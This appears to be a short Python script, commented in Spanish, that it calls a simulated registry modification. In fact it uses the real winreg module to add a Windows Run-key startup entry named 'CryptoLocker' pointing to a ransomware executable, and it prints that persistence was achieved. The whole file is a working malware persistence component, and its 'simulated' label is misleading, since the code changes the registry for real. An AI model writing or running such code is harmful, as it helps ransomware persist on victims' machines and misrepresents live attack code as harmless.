# registry_mod.py - Simulación de modificación de registro
# Agrega entrada para startup.

import winreg  # Simulado

def add_to_registry():
    key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, winreg.KEY_SET_VALUE)
    winreg.SetValueEx(key, "CryptoLocker", 0, winreg.REG_SZ, "C:\\path\\to\\ransomware.exe")
    winreg.CloseKey(key)
    print("Agregado al registro para persistencia.")

def main():
    add_to_registry()

if __name__ == "__main__":
    main()